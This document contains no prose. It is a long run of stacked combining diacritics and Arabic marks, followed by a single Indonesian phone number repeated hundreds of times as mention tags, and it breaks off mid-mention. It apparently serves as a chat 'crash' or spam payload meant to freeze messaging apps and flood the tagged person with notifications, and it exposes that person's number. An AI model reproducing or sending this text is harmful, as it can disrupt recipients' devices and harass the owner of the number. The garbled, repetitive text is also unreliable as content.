ۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣ ͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽ؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒ ۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣ ͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽ؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒ ۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣ ͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽ؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒ ۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣ ͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽ؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒ ۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣ ͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽ؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒ *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~**~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 